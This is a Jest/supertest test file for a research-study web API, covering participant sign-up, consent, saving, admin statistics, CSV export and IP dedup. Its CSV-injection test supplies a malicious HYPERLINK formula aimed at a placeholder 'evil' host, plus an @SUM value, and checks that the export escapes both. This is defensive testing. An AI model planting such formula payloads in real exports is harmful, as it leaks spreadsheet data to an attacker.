const request = require('supertest');
const { app } = require('../index');
const db = require('../config/database');
const { createTestUser } = require('./testHelper');

describe('Study API', () => {
  let adminToken;
  let researcherToken;

  beforeAll(async () => {
    // Clean up any leftover test data from prior runs.
    await db.query("DELETE FROM study_responses WHERE assignment_id IN (SELECT id FROM study_assignments WHERE participant_id IN (SELECT id FROM study_participants WHERE participant_code LIKE 'TH_%' OR participant_code LIKE 'CC_%' OR participant_code LIKE 'PM_%'))");
    await db.query("DELETE FROM study_assignments WHERE participant_id IN (SELECT id FROM study_participants WHERE participant_code LIKE 'TH_%' OR participant_code LIKE 'CC_%' OR participant_code LIKE 'PM_%')");
    await db.query("DELETE FROM study_participants WHERE participant_code LIKE 'TH_%' OR participant_code LIKE 'CC_%' OR participant_code LIKE 'PM_%'");
    await db.query("DELETE FROM users WHERE email LIKE '%studytest%'");

    const admin = await createTestUser({
      name: 'Study Test Admin',
      email: 'studytest-admin@example.com',
      role: 'admin',
    });
    adminToken = admin.token;

    const researcher = await createTestUser({
      name: 'Study Test Researcher',
      email: 'studytest-researcher@example.com',
      role: 'researcher',
    });
    researcherToken = researcher.token;
  });

  afterAll(async () => {
    await db.query("DELETE FROM study_responses WHERE assignment_id IN (SELECT id FROM study_assignments WHERE participant_id IN (SELECT id FROM study_participants WHERE participant_code LIKE 'TH_%' OR participant_code LIKE 'CC_%' OR participant_code LIKE 'PM_%'))");
    await db.query("DELETE FROM study_assignments WHERE participant_id IN (SELECT id FROM study_participants WHERE participant_code LIKE 'TH_%' OR participant_code LIKE 'CC_%' OR participant_code LIKE 'PM_%')");
    await db.query("DELETE FROM study_participants WHERE participant_code LIKE 'TH_%' OR participant_code LIKE 'CC_%' OR participant_code LIKE 'PM_%'");
    await db.query("DELETE FROM users WHERE email LIKE '%studytest%'");
  });

  describe('GET /api/study/list (public)', () => {
    it('returns active studies without auth', async () => {
      const res = await request(app).get('/api/study/list');
      expect(res.status).toBe(200);
      expect(Array.isArray(res.body.studies)).toBe(true);
      // The effort-justification study is seeded by migration 045 and is active.
      const slugs = res.body.studies.map((s) => s.slug);
      expect(slugs).toContain('effort-justification');
      const ej = res.body.studies.find((s) => s.slug === 'effort-justification');
      expect(ej.title).toBeTruthy();
    });
  });

  describe('POST /api/study/start (slug routing)', () => {
    it('returns 404 when an unknown slug is requested', async () => {
      const res = await request(app)
        .post('/api/study/start?slug=does-not-exist')
        .set('X-Forwarded-For', '10.99.0.201');
      expect(res.status).toBe(404);
    });

    it('returns study metadata in the response', async () => {
      const res = await request(app)
        .post('/api/study/start')
        .set('X-Forwarded-For', '10.99.0.202');
      expect(res.status).toBe(201);
      expect(res.body.study_slug).toBe('effort-justification');
      expect(res.body.study_title).toBeTruthy();
    });
  });

  describe('POST /api/study/start', () => {
    it('creates a participant + assignment with a known experiment + condition', async () => {
      const res = await request(app).post('/api/study/start');
      expect(res.status).toBe(201);
      expect(res.body).toHaveProperty('participant_code');
      expect(res.body).toHaveProperty('assignment_id');
      expect(['treasure_hunt', 'career_choice', 'pattern_memory']).toContain(res.body.experiment);
      expect(res.body.condition).toBeDefined();
      expect(typeof res.body.condition).toBe('string');
    });

    it('balances assignments approximately evenly across experiments', async () => {
      const N = 12;
      const counts = { treasure_hunt: 0, career_choice: 0, pattern_memory: 0 };
      for (let i = 0; i < N; i++) {
        const res = await request(app).post('/api/study/start');
        expect(res.status).toBe(201);
        counts[res.body.experiment]++;
      }
      const max = Math.max(...Object.values(counts));
      const min = Math.min(...Object.values(counts));
      // Spread should be small with the balanced picker.
      expect(max - min).toBeLessThanOrEqual(2);
    });
  });

  describe('POST /api/study/consent + /api/study/save + /api/study/finish', () => {
    it('records consent and a final save without marking complete; /finish sets completed_at', async () => {
      const start = await request(app).post('/api/study/start');
      const code = start.body.participant_code;

      const consent = await request(app)
        .post('/api/study/consent')
        .send({ participant_code: code, demographics: { age: 30, gender: 'Female' } });
      expect(consent.status).toBe(200);
      expect(consent.body.ok).toBe(true);
      expect(consent.body.consent_given_at).toBeTruthy();

      const save = await request(app)
        .post('/api/study/save')
        .send({ participant_code: code, payload: { total_coins: 42, end_time: '2026-05-06T12:00:00Z' } });
      expect(save.status).toBe(200);
      expect(save.body.ok).toBe(true);

      // After /save, completion is still null — participant hasn't seen the
      // debrief yet, so they aren't counted as complete.
      const beforeFinish = await db.query(
        'SELECT p.completed_at AS p_completed, a.completed_at AS a_completed FROM study_participants p JOIN study_assignments a ON a.participant_id = p.id WHERE p.participant_code = $1',
        [code]
      );
      expect(beforeFinish.rows[0].p_completed).toBeNull();
      expect(beforeFinish.rows[0].a_completed).toBeNull();

      const finish = await request(app)
        .post('/api/study/finish')
        .send({ participant_code: code });
      expect(finish.status).toBe(200);
      expect(finish.body.ok).toBe(true);

      const afterFinish = await db.query(
        'SELECT p.completed_at AS p_completed, a.completed_at AS a_completed FROM study_participants p JOIN study_assignments a ON a.participant_id = p.id WHERE p.participant_code = $1',
        [code]
      );
      expect(afterFinish.rows[0].p_completed).not.toBeNull();
      expect(afterFinish.rows[0].a_completed).not.toBeNull();
    });

    it('rejects save with unknown participant_code', async () => {
      const res = await request(app)
        .post('/api/study/save')
        .send({ participant_code: 'TH_does_not_exist_xxx', payload: {} });
      expect(res.status).toBe(404);
    });

    it('rejects /finish with unknown participant_code', async () => {
      const res = await request(app)
        .post('/api/study/finish')
        .send({ participant_code: 'TH_does_not_exist_xxx' });
      expect(res.status).toBe(404);
    });

    it('rejects /save when payload is not an object', async () => {
      const start = await request(app)
        .post('/api/study/start')
        .set('X-Forwarded-For', '10.99.0.150');
      const code = start.body.participant_code;
      const res = await request(app)
        .post('/api/study/save')
        .send({ participant_code: code, payload: 'a string is not an object' });
      expect(res.status).toBe(400);
    });
  });

  describe('GET /api/study/stats', () => {
    it('rejects unauthenticated requests', async () => {
      const res = await request(app).get('/api/study/stats');
      expect(res.status).toBe(401);
    });
    it('rejects non-admin users', async () => {
      const res = await request(app)
        .get('/api/study/stats')
        .set('Authorization', `Bearer ${researcherToken}`);
      expect(res.status).toBe(403);
    });
    it('returns per-experiment + per-condition counts to admins', async () => {
      const res = await request(app)
        .get('/api/study/stats')
        .set('Authorization', `Bearer ${adminToken}`);
      expect(res.status).toBe(200);
      expect(res.body.stats).toHaveProperty('treasure_hunt');
      expect(res.body.stats).toHaveProperty('career_choice');
      expect(res.body.stats).toHaveProperty('pattern_memory');
      expect(res.body.stats.treasure_hunt).toHaveProperty('conditions');
      expect(res.body.stats.treasure_hunt).toHaveProperty('total_assigned');
    });
  });

  describe('GET /api/study/export/:experiment', () => {
    it('rejects unauthenticated requests', async () => {
      const res = await request(app).get('/api/study/export/treasure_hunt');
      expect(res.status).toBe(401);
    });
    it('returns CSV for admins', async () => {
      const res = await request(app)
        .get('/api/study/export/treasure_hunt')
        .set('Authorization', `Bearer ${adminToken}`);
      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toMatch(/text\/csv/);
      // Header row should exist.
      expect(res.text.split('\n')[0]).toContain('participant_code');
    });
    it('rejects unknown experiment names', async () => {
      const res = await request(app)
        .get('/api/study/export/not_a_real_experiment')
        .set('Authorization', `Bearer ${adminToken}`);
      expect(res.status).toBe(400);
    });
  });

  describe('GET /api/study/participants (list)', () => {
    it('rejects unauthenticated requests', async () => {
      const res = await request(app).get('/api/study/participants');
      expect(res.status).toBe(401);
    });

    it('rejects non-admin users', async () => {
      const res = await request(app)
        .get('/api/study/participants')
        .set('Authorization', `Bearer ${researcherToken}`);
      expect(res.status).toBe(403);
    });

    it('returns recent participants with assignment metadata', async () => {
      const res = await request(app)
        .get('/api/study/participants')
        .set('Authorization', `Bearer ${adminToken}`);
      expect(res.status).toBe(200);
      expect(Array.isArray(res.body.participants)).toBe(true);
      if (res.body.participants.length > 0) {
        const row = res.body.participants[0];
        expect(row).toHaveProperty('participant_code');
        expect(row).toHaveProperty('experiment');
        expect(row).toHaveProperty('condition');
      }
    });

    it('filters by experiment', async () => {
      const res = await request(app)
        .get('/api/study/participants?experiment=treasure_hunt')
        .set('Authorization', `Bearer ${adminToken}`);
      expect(res.status).toBe(200);
      for (const row of res.body.participants) {
        expect(row.experiment).toBe('treasure_hunt');
      }
    });

    it('rejects invalid experiment filter', async () => {
      const res = await request(app)
        .get('/api/study/participants?experiment=garbage')
        .set('Authorization', `Bearer ${adminToken}`);
      expect(res.status).toBe(400);
    });
  });

  describe('GET /api/study/participants/:code (detail)', () => {
    let detailCode;

    beforeAll(async () => {
      // Use a unique X-Forwarded-For so the prior test's completed session
      // doesn't trip the same-IP dedup check.
      const start = await request(app)
        .post('/api/study/start')
        .set('X-Forwarded-For', '10.99.0.1');
      detailCode = start.body.participant_code;
      await request(app)
        .post('/api/study/consent')
        .send({ participant_code: detailCode, demographics: { age: 25 } });
      await request(app)
        .post('/api/study/save')
        .send({ participant_code: detailCode, payload: { total_coins: 7 } });
    });

    it('rejects unauthenticated requests', async () => {
      const res = await request(app).get(`/api/study/participants/${detailCode}`);
      expect(res.status).toBe(401);
    });

    it('rejects non-admin users', async () => {
      const res = await request(app)
        .get(`/api/study/participants/${detailCode}`)
        .set('Authorization', `Bearer ${researcherToken}`);
      expect(res.status).toBe(403);
    });

    it('returns full participant + assignment + responses', async () => {
      const res = await request(app)
        .get(`/api/study/participants/${detailCode}`)
        .set('Authorization', `Bearer ${adminToken}`);
      expect(res.status).toBe(200);
      expect(res.body.participant.participant_code).toBe(detailCode);
      expect(res.body.assignment).toBeTruthy();
      expect(res.body.assignment.experiment).toBeTruthy();
      expect(res.body.responses.length).toBeGreaterThanOrEqual(1);
      expect(res.body.responses[0]).toHaveProperty('payload');
    });

    it('returns 404 for unknown participant_code', async () => {
      const res = await request(app)
        .get('/api/study/participants/TH_does_not_exist_xxx')
        .set('Authorization', `Bearer ${adminToken}`);
      expect(res.status).toBe(404);
    });
  });

  describe('CSV formula injection defence', () => {
    it('escapes payload values starting with =, +, -, or @ so Excel does not execute them', async () => {
      const start = await request(app)
        .post('/api/study/start')
        .set('X-Forwarded-For', '10.99.0.55');
      const code = start.body.participant_code;

      // Manipulate the payload as a malicious participant would.
      await request(app)
        .post('/api/study/save')
        .send({
          participant_code: code,
          payload: {
            total_coins: '=HYPERLINK("http://evil/?x="&A1,"click")',
            extinction_chests_opened: 7,
            start_time: '+1234',
            end_time: '@SUM(1,1)',
          },
        });

      // Pick the experiment that this participant got assigned and export.
      const stats = await request(app)
        .get('/api/study/stats')
        .set('Authorization', `Bearer ${adminToken}`);
      expect(stats.status).toBe(200);

      const exp = start.body.experiment;
      const res = await request(app)
        .get(`/api/study/export/${exp}`)
        .set('Authorization', `Bearer ${adminToken}`);
      expect(res.status).toBe(200);
      // Every cell that starts with =/+/-/@ must be quoted and prefixed with '
      // so Excel/Sheets/Numbers treat it as a literal string, not a formula.
      // We check the raw CSV body — the malicious values must NOT appear unprefixed.
      expect(res.text).not.toMatch(/,=HYPERLINK/);
      expect(res.text).not.toMatch(/,@SUM/);
      // The escaped form should appear instead.
      if (exp === 'treasure_hunt') {
        expect(res.text).toContain(`"'=HYPERLINK`);
        expect(res.text).toContain(`"'@SUM`);
      }
    });
  });

  describe('Idempotent /save', () => {
    it('a second /save for the same participant updates the existing row instead of creating a duplicate', async () => {
      const start = await request(app)
        .post('/api/study/start')
        .set('X-Forwarded-For', '10.99.0.66');
      const code = start.body.participant_code;

      await request(app)
        .post('/api/study/save')
        .send({ participant_code: code, payload: { total_coins: 1 } });

      await request(app)
        .post('/api/study/save')
        .send({ participant_code: code, payload: { total_coins: 99 } });

      const finalRows = await db.query(
        `SELECT COUNT(*)::int AS n FROM study_responses r
         JOIN study_assignments a ON a.id = r.assignment_id
         JOIN study_participants p ON p.id = a.participant_id
         WHERE p.participant_code = $1 AND r.is_snapshot = false`,
        [code]
      );
      expect(finalRows.rows[0].n).toBe(1);

      const latest = await db.query(
        `SELECT r.payload FROM study_responses r
         JOIN study_assignments a ON a.id = r.assignment_id
         JOIN study_participants p ON p.id = a.participant_id
         WHERE p.participant_code = $1 AND r.is_snapshot = false`,
        [code]
      );
      expect(latest.rows[0].payload.total_coins).toBe(99);
    });
  });

  describe('Recruitment targets in /stats', () => {
    it('decorates conditions with target + progress when the study has a target', async () => {
      const res = await request(app)
        .get('/api/study/stats')
        .set('Authorization', `Bearer ${adminToken}`);
      expect(res.status).toBe(200);
      expect(res.body.study.recruitment_target_per_condition).toBe(80);
      // Migration 046 seeds effort-justification at 80/condition. Pick any
      // condition under any experiment and check the shape.
      const exp = Object.keys(res.body.stats)[0];
      const cond = Object.keys(res.body.stats[exp].conditions)[0];
      const c = res.body.stats[exp].conditions[cond];
      expect(c).toHaveProperty('target', 80);
      expect(c).toHaveProperty('progress_pct');
      expect(['on_track', 'near_complete', 'met', 'over']).toContain(c.status);
    });
  });

  describe('POST /api/study/follow-up', () => {
    afterAll(async () => {
      await db.query("DELETE FROM study_follow_up_signups WHERE email LIKE '%followup-test%'");
    });

    it('accepts an email + records it under the most recent active study', async () => {
      const res = await request(app)
        .post('/api/study/follow-up')
        .send({ email: 'followup-test-1@example.com' });
      expect(res.status).toBe(200);
      expect(res.body.ok).toBe(true);
      const rows = await db.query(
        "SELECT email FROM study_follow_up_signups WHERE email = $1",
        ['followup-test-1@example.com']
      );
      expect(rows.rows).toHaveLength(1);
    });

    it('is idempotent on a repeat submission', async () => {
      await request(app)
        .post('/api/study/follow-up')
        .send({ email: 'followup-test-2@example.com' });
      await request(app)
        .post('/api/study/follow-up')
        .send({ email: 'followup-test-2@example.com' });
      const rows = await db.query(
        "SELECT email FROM study_follow_up_signups WHERE email = $1",
        ['followup-test-2@example.com']
      );
      expect(rows.rows).toHaveLength(1);
    });

    it('rejects invalid emails', async () => {
      const res = await request(app)
        .post('/api/study/follow-up')
        .send({ email: 'not-an-email' });
      expect(res.status).toBe(400);
    });

    it('rejects unknown study_slug', async () => {
      const res = await request(app)
        .post('/api/study/follow-up')
        .send({ email: 'followup-test-3@example.com', study_slug: 'does-not-exist' });
      expect(res.status).toBe(404);
    });

    it('stores no reference to participant_code', async () => {
      // Belt-and-suspenders: confirm the table schema can't hold a participant
      // FK. If a future migration adds one, this test fails loudly and the
      // anonymous-promise wording needs to be revisited.
      const cols = await db.query(
        `SELECT column_name FROM information_schema.columns
         WHERE table_name = 'study_follow_up_signups'`
      );
      const names = cols.rows.map(r => r.column_name).sort();
      expect(names).toEqual(['created_at', 'email', 'id', 'study_id']);
    });
  });

  describe('Dedup by ip_hash', () => {
    it('rejects a second start within the dedup window if a prior session completed from same IP', async () => {
      const TEST_IP = '10.99.0.42';
      const start1 = await request(app)
        .post('/api/study/start')
        .set('X-Forwarded-For', TEST_IP);
      expect(start1.status).toBe(201);
      await request(app)
        .post('/api/study/save')
        .send({ participant_code: start1.body.participant_code, payload: { total_coins: 1 } });
      // /save no longer marks the participant complete — completion now
      // happens on /finish (clicked from the Debrief page). Without /finish,
      // dedup wouldn't trigger.
      await request(app)
        .post('/api/study/finish')
        .send({ participant_code: start1.body.participant_code });

      // Second start from the same IP should be rejected with 409.
      const start2 = await request(app)
        .post('/api/study/start')
        .set('X-Forwarded-For', TEST_IP);
      expect(start2.status).toBe(409);
      expect(start2.body.error.message).toMatch(/already completed/i);
    });

    it('allows starts from a different IP', async () => {
      const start = await request(app)
        .post('/api/study/start')
        .set('X-Forwarded-For', '10.99.0.99');
      expect(start.status).toBe(201);
    });
  });
});
